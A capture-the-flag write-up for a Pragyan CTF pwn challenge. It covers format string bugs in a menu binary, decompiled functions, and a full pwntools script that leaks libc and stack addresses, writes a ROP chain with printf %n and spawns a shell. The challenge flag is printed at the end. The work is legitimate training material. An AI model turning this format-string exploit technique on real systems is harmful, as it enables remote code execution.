# Portal

## Challenge

We're given binary and a server to connect to.
Connecting to the server or running the binary will show the following prompt:

```
Welcome!

What would you like to do?
1) Check Balance
2) Upgrade Pack
```

Options 1 and 2 call the functions `see_balance` and `init_pack`, respectively:

```c
void sym.see_balance(void) {
    int64_t in_FS_OFFSET;
    char *format;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.printf("You currently have Rs.%d left!\n", _obj.b);
    sym.imp.puts("Wanna upgrade pack?");
    sym.imp.fgets(&format, 100, _reloc.stdin);
    sym.imp.printf(&format);
    if (var_8h != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        sym.imp.__stack_chk_fail();
    }
    return;
}

void sym.init_pack(void) {
    if (_obj.b == 0xf9) {
        sym.upgrade_pack();
    }
    else {
        sym.imp.puts("You do not have enough balance :(");
    }
    return;
}
```

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

Notice that there is a format string vulnerability in the `see_balance` function.
We can use this to leak arbitrary values from the stack.

### My solution

Leaking a libc address and a stack addres will allow us to write a rop chain using multiple `printf` calls.

We can now repeatedly call `printf` using the `%n` conversion specifier to write a ropchain, 2 bytes at a time.

Finally, we enter `0` for our option, which is invalid and will cause the program to return.
Instead of returning into `libc_start_main`, the program will enter the rop chain and spawn a shell.

### Intended solution

Instead of leaking a libc address, we leak a `main` address to calculate the address of `_obj.b`.

Using the same vulnerability, we overwrite `_obj.b` with 0xf9 to reach the `upgrade_pack` function using option 2.

Here's what the function looks like decompiled:

```c
undefined8 sym.upgrade_pack(void) {
    int64_t iVar1;
    undefined8 uVar2;
    int64_t in_FS_OFFSET;
    undefined8 stream;
    char *format;
    char *s;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    iVar1 = sym.imp.fopen("flag_maybe", 0x20bc);
    if (iVar1 == 0) {
        sym.imp.puts("Flag not found.");
        sym.imp.exit(1);
    }
    sym.imp.fgets(&s, 0x80, iVar1);
    sym.imp.fclose(iVar1);
    sym.imp.puts("Upgrading PAcK");
    uVar2 = sym.imp.malloc(0x12d);
    sym.imp.puts("Enter coupon code:");
    sym.imp.fgets(uVar2, 300, _reloc.stdin);
    sym.imp.puts("Upgrading pack with the coupon:");
    sym.imp.printf(uVar2);
    _obj.check = 1;
    sym.see_profile();
    uVar2 = 0;
    if (var_8h != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = sym.imp.__stack_chk_fail();
    }
    return uVar2;
}
```

It reads the flag into memory, then there's another format string vulnerability.
We can use this to leak the stack and read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host binary.challs.pragyanctf.tech --port 6003 load
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('load')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

libc = ELF('libc6_2.31-0ubuntu9.2_amd64.so')

io = start()

io.sendlineafter(b"2) Upgrade Pack\n", b"1")
io.sendlineafter(b"Wanna upgrade pack?\n", "%{}$p".format(0x98 // 8 + 6).encode())
libc.address = int(io.recvuntil(b"\n", drop=True), 0) - libc.libc_start_main_return

io.success("Libc: " + hex(libc.address))

io.sendlineafter(b"2) Upgrade Pack\n", b"1")
io.sendlineafter(b"Wanna upgrade pack?\n", "%{}$p".format(0x70 // 8 + 6).encode())
stack = int(io.recvuntil(b"\n", drop=True), 0)

io.success("stack: " + hex(stack))

rop = ROP(libc)
rop.raw(rop.ret)
rop.call('system', [next(libc.search(b'/bin/sh'))])

rop_addr = stack+8

for gadget in [rop.chain()[i:i+8] for i in range(0, len(rop.chain()), 8)]:
    print(gadget)
    fmt = fmtstr_payload(6, {rop_addr: gadget}, write_size='short')
    rop_addr += 8;

    print(fmt)
    print(len(fmt))

    io.sendlineafter(b"2) Upgrade Pack\n", b"1")
    io.sendlineafter(b"Wanna upgrade pack?\n", fmt)

io.sendlineafter(b"2) Upgrade Pack\n", b"0")

io.interactive()
```

## Flag

```
p_ctf{W3ll_1t_W4s_3aSy_0n1y}
```
